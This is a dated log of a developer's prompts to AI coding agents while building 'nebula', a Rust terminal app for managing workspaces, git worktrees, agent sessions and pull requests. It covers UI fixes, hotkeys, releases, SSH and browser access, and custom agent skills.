- add the ability to do a nebula workspace add &lt;name> and then later nebula workspace open &lt;workspace_name>, then all projects will scoped to that workspace.  make sure the / fuzzy find doesn't search over all workspaces. also include a workspace list and workspace delete and workspace rename. inside nebula, add a modal and a hotkey to allow a user to switch between the workspaces they have. display the selected workspace bottom left bar.
- add a way to add a new workspace in the switch workspace modal when opened
- same with delete, rename in that same modal
- nah I'd rather it just show r and d in the bottom of the workspace panel like we do for the notes, we should need all these sub menus
- in the modal, you were supposed to add the list of key combos at the bottom of the workspaces modal like we do with the node modal. why did you not do this?

</details>

### Session 119

> track the last focused settings in the settings modal so even if it closes and reopens it'll be on that last setting

### Session 120

> [Image #1] there is a strange effect in only the worktree row where there are 2 empty spaces above and belove the status indicator to the right of the vertical bar.. it's like you forgot to color in space there, fix it

### Session 121

> instead of the todos or "notes" behind hidden in a modal, just make them show up in the worktrees panel at the bottom and also the sessions panel.  if it's a worktree specific note, it should show up in the session panel at the bottom word wrapped, so when I click on a worktree

### Session 122

> the open project path could use a better use experience, add a nice directory browser so they can easily dive into a directory or change pwd directly to where it needs to be, but also support them just typing and tabbing to find the directory they are looking for

<details><summary>1 follow-up prompt</summary>

- continue

</details>

### Session 123

> when I'm in a different workspace and I try to add a project that already exists on another workspace, it won't let me add it.  I think we should be able to add any projects to any workspaces.  a workspace is just a collection or projects that we should let a user decide how they want to group things

### Session 124

> give me feedback, right now I often press o to open a new project accidently and that opens the notes.  also on the nebula landing screen, the one with the spinning nebula ascii, my first instinct was to press o to open a new project.  I need to figure out what hotkey I should use for notes, but also the other wortrees and sessions like use n for the convention to "add new thing into list" which makes sense, so I'm wondering if we should allow both n and o, and o should just always try to open a new project

<details><summary>4 follow-up prompts</summary>

- yes
- commit and push
- ok change the new terminal hotkey to t, and change the todos to instead just be e hotkey for not(e)s, refactor the language so instead of it being todos it's just notes
- continue

</details>

### Session 125

> there is a strange bug where when I'm prompting claude to create a worktree, it does and I can see it show up in my worktree list, but then after I manually move a session to that work tree, at some point in the future that original session seems to switch back to whatever worktree it originally was on. is this a bug or am I not understanding something? I think maybe claude later in the future switches back cwd to what it originally was?  claude says the shell resets to that after each command, so I think maybe claude created the worktree, but it never updated it's cwd or something? do not make changes just help me answer this

<details><summary>1 follow-up prompt</summary>

- yeah I guess do that, kill the session then resume it in the worktree cwd? will that fix it?

</details>

### Session 126

> create a worktree and print hello world

<details><summary>1 follow-up prompt</summary>

- create three separate worktrees but do not switch this one to any of them

</details>

### Session 127

> what would I need to change on this machien to allow another to use nebula ssh into it

<details><summary>5 follow-up prompts</summary>

- ok well setup ssh so I can login remote to the webdevcody account to this laptop
- when I try to run it from another laptop it seems to just get stuck not printing anything
- ok actually I changed the port and it gave permissio ndenied publickey, how do I push a key to it
- curl 10.0.0.71:9999/key.txt it should have my public key
- it's working, verify the ssh is only configure to allow local network remote in, and nothing from the public internet

</details>

### Session 128

> sometimes nebula and clause seem to get into a state where when I use my track pad to scroll up in the output history it instead it says "Scroll wheel is sending arrow keys · use PgUp/PgDn to scroll" and it just keeps showing previous prompts I'm using, how do  I fix that

### Session 129

> is it possible to change the cursor when a user is hovering over the edge of a panel where they could expand or shrink it? there is no feedback to let a user know they can even change the width of these panels

<details><summary>1 follow-up prompt</summary>

- yes

</details>

### Session 130

> add a way for a user to configure the default command to load up when viewing files or editing, right now it defaults to vim, but I want someone be able to set it to neovim

### Session 131

> [Image #1] add more padding to the top of the terminal header so that it aligns better with the other panels

### Session 132

> add a built in way so that nebula remembers the hosts you've recently done `nebula ssh` with so that a user can press h to view all the hosts, navigate through them, and click them to automatically switch nebula to connect to that remote host.  if necessary, find a way to just kill nebula and re-run the stored host so we can make a fresh ssh connection. you decide the best approach forward and ask questions if you need to. I should also be able to "remove hosts" from that list.

<details><summary>1 follow-up prompt</summary>

- also add in the ability for someone to add in the remote host from that modal so that they don't need to use the nebula ssh command if they already have nebula open

</details>

### Session 133

> make the green vertical bar on the left side of the row of the worktrees list be full height of the row, right now it stops short on the top and bottom.  if needed, look at how we do it for projects as that one is setup correctly, after you fix it, make the session rows also use the same height as the worktrees row so they are uniform (I think they need to be set to a 2?)

### Session 134

> [Image #1] please try to fix the note indicator, is it possible to use a flat vector or something else instead? the empty box just looks bad and it's not obvious it's a note

<details><summary>1 follow-up prompt</summary>

- commit and push

</details>


## Sat, Aug 22, 2026

### Session 135

> when I an trying to edit the name of a note or other inputs that are nested inside this app, a user should be able to hold option + left arrow to go back to other inputs so they can more easily edit.  improve the user experience of inputs to work more like a normal terminal input with normal keybindings

<details><summary>1 follow-up prompt</summary>

- make a pr when done and open browser

</details>

### Session 136

> There seems to be a bug for when I first use the main root work tree and in the prompt Cloud Code creates a new work tree. It doesn't seem like it automatically moves that session into the new work tree and the work tree list that it just created. make a pr when done open for me in browser

### Session 137

> Sometimes after Cloud Code is done accepting the user input, the session still stays red. It should probably switch back to green so that we know that it's not running anymore.

### Session 138

> When I'm using the jump to project feature and I type in a work tree name and press enter, it seems to focus on the work tree panel when it does the click. Instead, could you focus on the actual sessions panel of the work tree that I wanted? Also, verify that the statuses match the colors in the search results that they match on the actual projects, work trees, and sessions lists. So that if there is a running session in the search, you'll see that that thing is running. Try to also apply the animated text to that if possible.

### Session 139

> it doesn't seem lke when I send a prompt to codex it updates the session title with it's best title, look into how we do it for claude code and replicate that behavior.  simplify the code if necessarsy so that we do no duplicate a lot of code.

<details><summary>1 follow-up prompt</summary>

- it It doesn't seem like it updates the status either. For the codecs, it just stays gray even when I prompt it. Can you debug that? Again, look into how we do a quad code and make sure that the approach is similar and not duplicating a bunch of code everywhere.

</details>

### Session 140

> what is the capital of colorado

<details><summary>1 follow-up prompt</summary>

- ask me my favorite color using the question tool

</details>

### Session 141

> no prebuilt binary for this platform yet — falling back to cargo... fix.  also update readme to walk user how to use this

<details><summary>3 follow-up prompts</summary>

- ok pull latest from origin mian
- k verify
- commit my wip

</details>

### Session 142

> when I have the arhicved list showing, allow a user to scroll through it using track pad or as we arrow down it should also follow their focus and scroll

### Session 143

> verify we have latest from main

### Session 144

> when I'm on the nebula splash screen, do not show all the hotkeys in the bottom bar unless they can actually be used

<details><summary>2 follow-up prompts</summary>

- commit puh do a release
- commit push release

</details>

### Session 145

> add better error messaging if someone tries to open a project directory and they don't have git on their path, tell them to install it

<details><summary>3 follow-up prompts</summary>

- what other deps are needed to run this app
- verify we warn the user if they don't have claude installed if they try to create a cc session, same with the other a=harnesses
- yes

</details>


## Sun, Aug 23, 2026

### Session 146

> on the bottom bar, add more padding to the top of the bar so it matches the same padding that's on the bottom

### Session 147

> when I am in the jump to modal and I click a project, it should focus on the worktrees panel instead of the projects panel

### Session 148

> add a settings option which allows a user to skip the naming of an agent session (assume they always just plan to use the automatic renaming after claude starts). keep it false as default and force a user to name their sessions

### Session 149

> show the harness type next to the session name (gray smaller text after the session title0

### Session 150

> add the ability to attach a url to a worktree. the use case is as a user I want to basically attach pull request links or other documentation links related to the task directly as a link so I can click enter in it to open it in my browser.  make this a separate section inside the sessions panel. if a pull request is already opened on that branch or worktree, show it as the first link in the links section. make adding a link similar approach to other things by using a modal with an input, allow ability to edit and delete links from the list (although do not allow deleting the pull request link)

### Session 151

> change one thing and make or

<details><summary>1 follow-up prompt</summary>

- change one thing and make pr

</details>

### Session 152

> commit and push

### Session 153

> in the fill tree browser when previewing files show line numbers on left gutter

### Session 154

> commit abd push'=

### Session 155

> Find a single bug in this code base that you think is a bug and try to fix it.

### Session 156 · `codex`

> print hello world

<details><summary>2 follow-up prompts</summary>

- ask me my favorite color
- ask me my favorite color using the ask question tool

</details>

### Session 157

> ask me my favorite color

### Session 158

> change one piece of text anywhere and make a pull request

### Session 159

> make a worktree called yolo

### Session 160

> I noticed that one of my sessions created a pull request but that link was not auto detected, I think when I switch to a worktree you should run a background process to check if any pull request are open and show them as links.  if a pr link is already detected then you no longer need to re-run this background task.

### Session 161

> Hey, can you add a feature to do X, Y, or Z?

### Session 162

> I noticed that when I cancel Claude code, it never actually changed the status back to green from that yellow animation. Can you debug and fix this?

<details><summary>1 follow-up prompt</summary>

- ask me my favorite color using the question tool

</details>

### Session 163

> change 1 random text in the landing page to make it better

<details><summary>1 follow-up prompt</summary>

- commit and push and make a pull request

</details>

### Session 164

> change to MIT license

<details><summary>1 follow-up prompt</summary>

- use Cody Seibert as the copyright holder

</details>

### Session 165

> is https://ratatui.rs/ used on this project? what third party lib do we use?

<details><summary>2 follow-up prompts</summary>

- verify we are on the latest version of all of these, and also verify they are all MIT license or able to be used on this MIT tui I'm making
- /goal upgrade one at a time, verify no security issues with the version we are upgrading to, run tests to verify nothing breaks

</details>

### Session 166

> give me a 1 sentence feature idea

### Session 167

> make 1 change in a read me, do this work in a worktree

### Session 168

> when I prompt my main root worktree in claude to do the work in a worktree, it does successfully create the worktree and it shows up in the worktree list, but the session takes a while before it is moved into the worktree... investigate how this works and if there is a way to make automatically move to the cooresponding worktree the work session is now working on

### Session 169

> if possible, track how many NEW comments were added since the last click on a pull request link, it would be nice to see when others have left comments so I know to go watch and review

### Session 170

> when I create a worktree name, allow a user to type in spaces in the worktree name but you must convert the spaces to hyphens.  also allow a user to just enter on the branch which will pick a random branch name using three words combined such as yellow-fox-jumps &lt;adj>-&lt;noun>-&lt;verb>

### Session 171

> convert the link hotkey from L to lower case l

### Session 172

> in the settings add a top tabs which a user can use arrows or tabs to navigate though. challenge my prompt, pick the best user experience. make good tab categories for where to put settings.  now I need you to add in a setting for hotkeys, allow a user to customize ANY HOTKEY in the application from that menu.  make sure it warns if you try to use a duplicate hotkey.  keep in mind some hot keys will just not work because we are running nebula inside other terminals such as ghostty or terminal.app, so keep that in mind that some hotkeys probably won't even be possible, such as cmd + ] as that is owned by ghostty to switch top level terminal tags.

### Session 173

> review the existing features in nebula and verify the readme is up to date on what we provide

<details><summary>1 follow-up prompt</summary>

- eli5

</details>

### Session 174

> is the session status is running or awaiting feedback it should always be at the top of the recent list

<details><summary>1 follow-up prompt</summary>

- eli5

</details>

### Session 175

> change readme in worktree

### Session 176

> order the sessions by last interaction date, also display a time last interacted next to the session title to right but left of harness name, so the workflow is a session runs goes to top of list, if anything else iteracts it would go top. when displaying the last interaction time just show "23m ago" format

<details><summary>1 follow-up prompt</summary>

- commit and push, then release with good change log with detials on what changed, make release skill when done to follow these steps

</details>

### Session 177 · `cursor`

> what lang is this written in

### Session 178

> update claude.md to invoke a skill called nebula-memory which has instructions on how an agent should summarize the original request, how we fixed or implemnted it, and any gotchya you ran into along the way. update the claude.md to instruct agents to read the memory.md file that the skill updates and use any related context related to what the user is prompting

<details><summary>2 follow-up prompts</summary>

- `Aug 24` go through all previous sessions for this project and invoke the nebula-memory skill starting with oldest last so we can document how we grew this project.  verify the memory skill mentions to include original prompt
- `Aug 24`

  > 1. when you say short index, like a table of contents that link to the individual archived.md memory?  
  > 2. yes need to add those there too probably do symb link as claude is my main  
  > 3. I'll ask you when I need to


</details>


## Mon, Aug 24, 2026

### Session 179

> add a way for a user to open a browser directly to the git repo github, i guess check their remote for github and opem there when this hotkey is pressed

### Session 180

> when I load up 2 separate nebula instances, they both seem to switch workspaces when one does... this isn't how it should work, each new nebula instance can point to a different workspace (or even point to a separate host - verify that is possible)

<details><summary>2 follow-up prompts</summary>

- please verify that this issue won't happen again when I'm doing development
- update nebula-memory as well after you've confirmed this is fixed

</details>

### Session 181 · `cursor`

> commit and push and make use release skill to make a release

### Session 182

> is there a release skill in this repo?

<details><summary>2 follow-up prompts</summary>

- commit and push and do another release
- make a skill called release which kicks in and does these similar steps the next time someone asks

</details>

### Session 183

> shift +j and shift + k should navigate like user pressed left and right arrows

### Session 184

> [Image #1] compress and show this image on the readme.md so that someone knows what this app does, improve the readme.md to be like some of the top rated github repos you know that also helps market the app

### Session 185

> when a user opens a project, it should try to fetch all open pull requests and display those on the bottom of the worktrees list, so a user can easily see which pull requsts are still open and enter or click into them to open in browser. make sure you make this efficient as gh might have rate limits, and some projects might have a LOT of opened pull requests, also make sure a user can easily fuzzy find (/) to those pull requests by title which when opened will open the browser instead of trying to switch to a session or worktree, etc

<details><summary>5 follow-up prompts</summary>

- continue
- continue
- continue
- is it possible so that when I hover over a PR i nthe open pr list, it'll show the contents of the PR directly in nebula for me to read? also the ability to just view the git diff of that PR directly in nebula?
- commit and push and do a release

</details>

### Session 186

> explain how I could run a claude session in the cloud to do work on this repo and make a pull request from the cloud, is that possible?

<details><summary>5 follow-up prompts</summary>

- 1. why wouldn't claude just make the pr for me?
- is this cloud stuff provided in my max 20x sub?
- so if I run claude --cloud does that mean my terminal is connected to some remote session in claude's servers where I'm prompting?
- is this cloud stuff provided in my max 20x sub?
- so if I run claude --cloud does that mean my terminal is connected to some remote session in claude's servers where I'm prompting?

</details>

### Session 187 · `codex`

> is the only way to run a claude --cloud session is by passing the prompt with it?

<details><summary>1 follow-up prompt</summary>

- ok add in an option so a user can press tab when hovered over the claude option in the new session harness selection modal, and when they press tab, it should toggle claude cloud which will mean now when they press enter, it'll show 1 more dialog prompt so a user can type their prompt and then invoke claude using the --cloud argument, then that will launch claude with --cloud and their prompt, make sure the prompt word wraps and allows a user to read multiple lines when they are prompting.

</details>

### Session 188 · `codex`

> it looks like luna and terra are missing from the codex menu when creating a new session, add them

### Session 189

> make a worktree, change one thing in the readme, make a pull request

### Session 190

> [Image #1] I want the / fuzzy finder to be more fuzzy, like I should be able to type neb #10 and it would have displayed the pr that had the #10 in it, right now it shows nothing if I type "neb #10"

### Session 191

> when a pr is closed, we should periodically check from github to see if we should remove from our list, also maje sure draft prs are included in that list we show

### Session 192

> display the version number of nebula in the bottom bar somewhere, I think bottom left should say nebula vx.y.z

### Session 193

> why does it say v0.2.0 when I run nebula locally but I know I am up to 0.4.0 release?

<details><summary>1 follow-up prompt</summary>

- no, get all these changes into main and make sure we are also on the latest of main, idk why we used a worktree to run a release

</details>

### Session 194

> when I run nebula upgrade on another computer, it says installed nebula 0.4.0 but when I run nebula --version it still prints 0.1.0 and I don't see any of my new changes, does nebula upgrade actually work?

### Session 195

> work on https://github.com/AgentSystemLabs/nebula/issues/8 in a worktree make pr when done, move notes and links to other hotkeys, but h and l should be for left and right

### Session 196

> try to fix this style issue, see attached image https://github.com/AgentSystemLabs/nebula/issues/6

### Session 197

> the screenshot on readme is not showing on github repo page


## Tue, Aug 25, 2026

### Session 198

> commit push and tag a new release 0.5.0 version

### Session 199

> when I open / make a new project, it should auto focus it after creating

<details><summary>2 follow-up prompts</summary>

- commit and push everything, then do another release
- ok so figure out why i have 6 file changes on main but you're saying all is good, something feels broke ELI5

</details>

### Session 200

> is there a way to open nebula using a chrome browser? like nebula web to open in a browser to connect to the terminal

<details><summary>2 follow-up prompts</summary>

- what is ttyd, do I have it installed?
- add a nebula browser command which will just run this ttyd command and open the browser to that port, if ttyd is not found, show a helpful error message that we depend on it

</details>

### Session 201

> add the ability to show a "workspaces" column to the left of projects which acts similar as projects, basically we should be able to see from a top level which workspaces are running something, add a hotkey of capital W shift + w to toggle that entire panel away or not. also clicking on the workspace in the bottom bar should show the workspace select modal

### Session 202

> for some reason, in a terminal of my project is says I'm on main, but that root row in worktrees list shows a worktree name and under it there is a main row for a worktree, but when I click it and open a terminal, it points to a worktree called gentle-narwahl-files.  can you double check the logic around worktrees and the root row to determine why my root row isn't matching my actual branch I have, and why somehow a worktree row is labeled as main

<details><summary>1 follow-up prompt</summary>

- yes fix them

</details>

### Session 203

> commit and push and make a next version release

<details><summary>4 follow-up prompts</summary>

- ok pull in latest from origin/main then and merge into this work them commit push and make the next release
- ````text
  bro just fix this webdevcody:~/Workspace/AgentSystemLabs/nebula$ git pull
  Updating 8beee5a..472ea68
  error: Your local changes to the following files would be overwritten by merge:
          .claude/MEMORY.md
          Makefile
          crates/nebula-tui/src/app.rs
          crates/nebula-tui/src/event_loop.rs
          crates/nebula-tui/src/ui.rs
          crates/nebula/src/browser.rs
  Please commit your changes or stash them before you merge.
  Aborting
  ````

- is the ladoe
- does the latest release have everything?

</details>

### Session 204

> what is the proper way people run rust programs doing iterative development? is using a make file the proper way?

<details><summary>3 follow-up prompts</summary>

- ok so what is my dev process to test the latest code changes then?
- sure make one command I can run to verify I always get the latest version of nebula when I run it
- sure make one command I can run to verify I always get the latest version of nebula when I run it, feel free to refactor any approach to how we run make to make it match how other rust projects do it.

</details>

### Session 205

> still when I run make dev, it shows version v0.4.0 in the bottom left and now it seems like all my projects and workspaces are done

### Session 206

> also allow dragging the workspaces panel to resize like we do on the other panels

### Session 207

> when running nebula browser, there is a bunch of empty space in the right side of the terminal panel... fix this.  running nebula in iterm or ghostty doesn't have this extra space

### Session 208

> when I ran nebula browser, it still seems to load up an older version of neb

<details><summary>1 follow-up prompt</summary>

- make sure there is a make browser command which again will run nebula in browser mode but with the latest version

</details>

### Session 209

> remember if someone had the workspaces panel collapsed so you don't show it the next time, also allow to configure showing it or not in the settings

<details><summary>1 follow-up prompt</summary>

- also allow the jump to to include the entire workspaces path so I can quickly jump between workspaces whenever

</details>

### Session 210

> commit and push and do another release

### Session 211

> what is the current latest release version of nebula?

<details><summary>1 follow-up prompt</summary>

- checkout latest from main

</details>

### Session 212

> make a random. txt file for me

### Session 213

> when I created a new worktree and had it create a pull request, I didn't see the pull request link auto show up for me, what logic is responsible for this and is there a potential bug?

### Session 214

> add this feature

### Session 215

> fix this bug

### Session 216

> remove the ability for a user to divide the projects column

### Session 217

> when a user has multiple workspaces, and he hovers over a workspace with no projects, it should NOT show the nebula splash screen.  that screen should only show when a user is on default workspace with no projects

### Session 218

> in a worktree, debug a performance issue when a user switches between workspaces sometimes it seems like it's lagging or stuck loading up multiple claude sessions as the terminal panel doesn't show for like 5-10 seconds

<details><summary>2 follow-up prompts</summary>

- `Aug 26` continue
- `Aug 26` run make browser

</details>

### Session 219

> in a worktree, protype having the workspaces actually be a top bar with WORKSPACES on the left aligned vertically above PROJECTS, but on the right it lists out the workspaces as tab buttons, each with a shortcut of cmd + [1-9] to select the workspace (or click), or when focus a user can use navigation keys to toggle through

<details><summary>1 follow-up prompt</summary>

- `Aug 26` merge latest from origin main into this and verify it works, find a way to  be able to run nebula without port conflicts as i run in various worktrees

</details>

### Session 220

> when I load up the settings, it should always focus on the tab (or last selected tab + option combo)


## Wed, Aug 26, 2026

### Session 221

> on settings modal add a hotkey to reset to default with confirmation that your settings will be cleared

### Session 222

> remove the move to worktree button and instead find a better way to hook into when a user prompts for a worktree, claude via a skill + system prompt or something knows to create the proper worktree in nebula and assiocate the sesion with it

<details><summary>1 follow-up prompt</summary>

- what branch did you do  this on

</details>

### Session 223

> when nebula first loads, it seems to auto remember my last select pref, but it doesn't seem to show the focused session terminal

### Session 224

> commit and push and release

### Session 225

> make pr

### Session 226

> i neeed a way to track when a session goes from yellow to green, it should put a counter in the projects, worktrees row so I know how many terminals I need to check,  as I navigate down into rows it should decrement and eventually hide the notification counts

### Session 227

> find if there is a way to attach claude when waiting for the cloud to finish so thhat they don't need to go into abrowser to use

<details><summary>2 follow-up prompts</summary>

- > it stil just ays No .nvmrc file found  
  > Please see `nvm --help` or https://github.com/nvm-sh/nvm#nvmrc for more information.  
  > No .nvmrc file found  
  > Please see `nvm --help` or https://github.com/nvm-sh/nvm#nvmrc for more information.  
  > Created cloud session: Hello world  
  > View: https://claude.ai/code/session_016SiQW5Lem2LbnUf1A3undt?from=cli&m=0  
  > Resume with: claude --teleport session_016SiQW5Lem2LbnUf1A3undt
  >
  >  wjen I do a cloud runner

- yes do it

</details>

### Session 228

> make sure deleting a workspace shows a confirmation

### Session 229

> make dev is still showing the wrong version. pull latest from main into this

### Session 230

> when i switch between workspaces it should remember the last project, worktree, session slection

<details><summary>1 follow-up prompt</summary>

- hi

</details>

### Session 231

> remove the ability to add notes

### Session 232

````text
why is it printing ⏺ Bash(nebula rename Remove Notes Feature 2>&1 | head -5)
  ⎿  Error: daemon speaks protocol v26, this client v24 — run `nebula kill` and rela
     unch I've ran kill but the hook still seems to fail
````

<details><summary>5 follow-up prompts</summary>

- why doesn't make dev do this already though
- ELI5
- so the hooks bsically call the nebula cli instead of using a skills and hitting nebula server directly?
- what do you recomend
- sure

</details>

### Session 233

> commit push release

### Session 234

> don't put the number of running sessions in workspace hreader tabs, just show "2 done"

<details><summary>3 follow-up prompts</summary>

- `Aug 27` replace word "new" with "done"
- `Aug 27` can you make the status dot for done a different color than green so it's obvious something needs to be addressed
- `Aug 27`

  > no you misunderstood, it should be green after I focus on the session, but purple when  
  >   done and not yet read


</details>


## Thu, Aug 27, 2026

### Session 235

> add more padding on top workspace header on bottom

<details><summary>2 follow-up prompts</summary>

- no you misunderstood, it should be green after I focus on the session, but purple when done and not yet read
- [Image #1] make it more obvious the workspace is focused and try to keep the bottom border when focused

</details>

### Session 236

> commit push release

### Session 237

> still when I try to create a claude cloud session, it doesn't seem to update me with the changes, it just says use a command to resume, and if i leave and come back to that terminal it errors out.  find a way to allow the cloud session output to show up in the ui

### Session 238

> [Image #1] fix the small gap between the header workspace name and the bottom bar if possible

### Session 239

> when I try to copy text after doing nebula ssh into an ubuntu machine I spun up, it keeps saying copy failed (clipboard unavvailable). help me debug if this is something I need to support in nebula using ssh -X or if I just need to install something on the device

<details><summary>2 follow-up prompts</summary>

- no I'm running nebula ssh top level in ghostty.  commit push and make a release for me
- pull latest from main

</details>

### Session 240

> when I run nebula browser, I want to be able to pass an option to allow public access. for example I'm hosting nebula on an ec2 instance, and the security group only allows 3 specific ips, so I need nebula to bind to a public accessible address instead of localhost only, but still support localhost as the default

### Session 241

> add an `nebula tunnel user@ip` which should ssh into a machine, install nebula if it doesn't exist, then it should run `nebula browser` on that machine, and then setup an ssh tunnel on that port, then open the browser to that port for them.

### Session 242

> when a user has the workspaces top bar hidden, display the selected workspace name in place of where it says Projects inside the projects list

<details><summary>2 follow-up prompts</summary>

- when using control shift h or l it should auto focus on claude code session when focused. also we shouldn't loop the nav, if the hit terminal panel then control shift l stops
- I think you misunderstood me, I liked the control shift h and control shift l, but now it doesn't work, I just wanted so if a user presses control shift l and gets to the terminal it should auto focus it and stop allowing the user to cycle next to the workspaces top na

</details>

### Session 243

> see if it is possible to add in cmd + [ and cmd + ] to navigate the panels, and if I'm already focused on a claude session, cmd + [ should take me out and put me on the sessions list (similar to pressing control + q)

<details><summary>3 follow-up prompts</summary>

- what keys might be free which would work in ghostty?
- I mean is it possible to unbind those JUST for the ghosty screen which is running nebula and not globally?
- ok but I'm running nebula in ghostty without any splits but I still can't run cmd + [

</details>

### Session 244

> was there a worktree related to performance navigation and terminals taking time to load / display?

<details><summary>4 follow-up prompts</summary>

- yes
- something in this conversation caused the worktree to show up in the UI but then it switvhed yp detached at f816b5f.  I wouldn't have expected the wortree name to become detached
- make pr
- fix conflicts

</details>

### Session 245

> [Image #1] I notice I have a BUNCH of unknown agents.. are these sub agents claude is spawning? is so display grouped in tree format.. also try to figure out a better label for them.  find root cause what these are from

<details><summary>2 follow-up prompts</summary>

- commit and push all work to main
- delete random.txt

</details>

### Session 246

> I can't seem to click on certain places of the root worktree row in some areas, other rows are fully clickable zones, fix it

### Session 247

> go through the code and find places you can dry up magic numbers, remove duplicate code, improve code to match rust best practices. verify we have a test before the code you're about to refactor or write one if not, then refactor, make pr when done

### Session 248

> analyze memory.md for how i normally prompt and give me patterns you see, good or bad

<details><summary>1 follow-up prompt</summary>

- using this info, create a skill called prompt-daddy which will take your original prompt and give you 3 examples to pick from that improve the original prompt, add prompt daddy to claude.md instructions so my agent uses it on every new prompt

</details>

### Session 249

> find 5 major security improvements

<details><summary>1 follow-up prompt</summary>

- /goal fix all, separate commits

</details>

### Session 250

> do a security review, find 1 issue to fix

<details><summary>1 follow-up prompt</summary>

- ask me again

</details>

### Session 251

> when navigating with the h and l keys, extend it so when i double tap the h or l when I'm at the locked layer, it should act as if I did a control shift h or l command

<details><summary>2 follow-up prompts</summary>

- with your changes, it incorrectly allows me to toggle past sessions list into the terminal panel, and the reverse end I incorrecly can press h once to get to the workspaces.  how it really should work is a user must double tap h to "jump" over that blocked boundary. you should just be able to add a 50ms elaose time check to add this, but find other options
- `Aug 28` what

</details>

### Session 252

> what 3 features would you recommend I remove

<details><summary>4 follow-up prompts</summary>

- `Aug 28`

  > rewrite this in a format like this:
  >
  > ===========  
  > === YOU ASKED  
  > "&lt;previous prompt used to get this output>"

- `Aug 28`

  > rewrite this in a format like this:
  >
  > ==== YOU ASKED ====  
  >  "&lt;previous prompt used to get this output>"
  >
  > ==== OVERVIEW ====  
  > should be a concise overview of what the change was, very high level
  >
  > ==== TECHNICAL OVERVIEW ===  
  > this is where you dive into the harder concepts. urge on the side of simplification so that the output is more concise, a user can just ask for more details.

- `Aug 28` in the YOU ASKED section we should be only displaying the prompt created by prompt-daddy
- `Aug 28` use this final output structure as a skill called output-doctor which prompts the agent to use that format I provided for all output. update claude.md to always use this skill before it outputs anything

</details>

### Session 253

> when the help modal is up (or all modals), a user should be able to click outside to dismiss it

### Session 254

> if a user tries to open the settings modal for the first time, it should start focused on the setting bar and if the launch it later it should retain their position.  extend this logic to support timing out that retain so if it's been 1 minute since opening it should revert back

### Session 255

> analyze my projetc and also previous chat history in memory.md, I want you to create a TERMS.md which has a descriptive name for various features, routes, short cuts, naming to help describe the project better between tean mates.  update claude.md to call a project-terms skill which will update that TERMS.md with useful new terms after every prompt like we do for nebula-memory.  update the claude.md to load and always speak in those terms. update the prompt-daddy to use those terms when rewrighting your prompt


## Fri, Aug 28, 2026

### Session 256

> update makefile to include a kill & install & dev all in one I can keep re-running when I need

### Session 257

> when someone makes a new workspace, it should focus on the projects list

<details><summary>1 follow-up prompt</summary>

- when the workspace is deleted, it should select the previous workspace in the list. if deleting the first workspace, select the next, if deleting from the middle, we should focus on the workspace to the right

</details>

### Session 258

> make sure the claude.md mentions that all output from the LLM should try to use the defined terms to make easier to read to our team

### Session 259

> update the project-terms skills:
>
> keep the architecture around the self improving look, but the main improvement I'd make is changing project-terms from "harvest words from every session" to "detect vocabulary discoveries every session, but only promote concepts that have actually become canonical."

### Session 260 · `cursor`

> explain this app

### Session 261 · `cursor`

> explain this project

### Session 262 · `cursor`

> what's the name of this project

### Session 263 · `codex`

> do a security audit on this code https://github.com/AgentSystemLabs/nebula/pull/19, leave a 1-5 rating on risk and security concerns

<details><summary>5 follow-up prompts</summary>

- convert this idea of a security & risk audit into a claude skill for me, a user should be able to invoke it using a "run the pr security audit" or something similar
- > also why did it complain with  The repository’s required rtk command is not installed in this environment, so its first  
  >   reads failed before touching the repo. I’m confirming that tool gap, then I’ll continue with  
  >   equivalent read-only commands so the audit itself isn’t blocked.. remove any RTK stuff from my setup

- ok so like run this skill on that original pr i gave you
- did this security review actually run tests on a potentially malicious user's pr?
- fix the conflicts on that pr then just merge it

</details>

### Session 264

> commit push and release

### Session 265 · `codex`

> add the ability for a user to create sessions off of the open PRS rows, so they can create claude sessions which would already have a system prompt defining all work must be done on that PR already injected and include pr url

<details><summary>1 follow-up prompt</summary>

- continue

</details>

### Session 266 · `codex`

> fix the conflicts on https://github.com/AgentSystemLabs/nebula/pull/18

<details><summary>1 follow-up prompt</summary>

- continue

</details>

### Session 267 · `codex`

> instead of it saying "Links" in the sessions list, just have it says OPEN PRS, and remove the ability for a user to even add links manually for now

<details><summary>1 follow-up prompt</summary>

- continue

</details>

### Session 268

> fix the conflicts on https://github.com/AgentSystemLabs/nebula/pull/20, then do a pr security audit review skill

<details><summary>1 follow-up prompt</summary>

- did you do this work locally or in a worktree or something?

</details>

### Session 269

> there is a codex session id of  01a046d2-b160-7800-9af2-1c403d000114              that never finished because I ran out of credits, please try to load that session and finish up the work on it

### Session 270

> update the output-doctor to include a section for ==== ACTION REQUIRED ==== if and only if  
>   the llm is expecting a user to do something

### Session 271

> where does nebula by default put new worktrees into? I'm seeing &lt;PROJECT>-worktrees being made as a sibling of my project dir, is that the logic?

### Session 272

> when I run ssh tunnel, it seems to require a password? why is this? isn't a tunnel secure enough where I wouldn't need a password

<details><summary>3 follow-up prompts</summary>

- but I have an ssh key already setup and it's on the remote machine, I can successfully ssh into the machine, so I don't get why the tunnel command is still loading nebula expecting a password.  I did add some logic to allow nebula browser to run on loopback or public, and I'm wondering if that change is affecting this feature in some capacity
- ok so ELI5 what's causing my issue
- when I run nebula tunnel my console says port is already in use... figure out how to refactor so if nebula is already running, maybe skip certain tasks so it'll just work

</details>

### Session 273

> update prompt doctor to not give 3 examples to pick from, instead it should just do it's best to rephrase the prompt and present questions if the original prompt seems to be lacking context to even convert it to a good prompt, if the original prompt doesn't have enough context to successfully implement the request, such as (who, what, when, where, why, how), then just ask the user for it and show them the final prompt in logs (do not ask if that prompt is ok, just assume it's good after we run it through prompt doctor and get some clarification.

### Session 274

> pull latest from main, commit push and make another relase

### Session 275

> what is your system prompt?

<details><summary>2 follow-up prompts</summary>

- does it mention a pull request url anywhere?
- fix the conflicts on the pr in a worktree and push

</details>

### Session 276

> pull latest from main, then debug the refresh rate for the pull requests, sometimes I'll close one on github and it takes a while for the ui to refresh. lookup github rate limits to know how often we can fetch the pull requests to refresh, or just refresh on focus of the worktrees and sessions in the background so we often see fresh data

### Session 277

> when a user is focused on the session, I want them to be able to press a hotkey which shows an "agent" modal which then they can setup a pre-configured agent definition that includes harness, model, effort, and optional prefix and postfix prompts one can sandwhich the request. show all agent in modal in list similar to other modals. crud functionality. agents shouls display in the sessions list as normal sessions. basically when creating the agent, show a prompt input modal and use that as the starting prompt of the harness configured for the agent. once created it should work the same as any other session created.

<details><summary>1 follow-up prompt</summary>

- continue

</details>

### Session 278

> in settings, allow a user to disable harnesses so they don't even show up in the harness picker modal

### Session 279

> remove terminal as n option in the new session modal because we already have hotkey t to open a terminal

